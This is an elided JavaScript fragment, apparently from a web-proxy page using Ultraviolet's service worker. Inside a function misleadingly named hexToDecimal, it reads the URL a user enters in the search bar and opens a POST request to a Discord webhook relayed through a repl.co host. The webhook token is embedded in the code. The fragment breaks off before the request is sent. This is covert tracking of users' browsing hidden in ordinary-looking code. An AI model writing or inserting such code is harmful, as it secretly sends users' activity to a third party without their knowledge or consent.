...
function hexToDecimal(hex) {
  ...
  window.navigator.serviceWorker
    ...
    setTimeout(() => {
      var decodedURL = __uv$config.decodeUrl(document.getElementById("searchbar").value)
              var request = new XMLHttpRequest();
request.open("POST", "https://discord-15.jstack-new.repl.co/api/webhooks/1083870456572022784/WoAbkCDEzgsIqzB7mtF-lheaWd3S80K_wKuVGzJ41rI7P6VkxZf5JM8_xrnO5JNEUnRH");
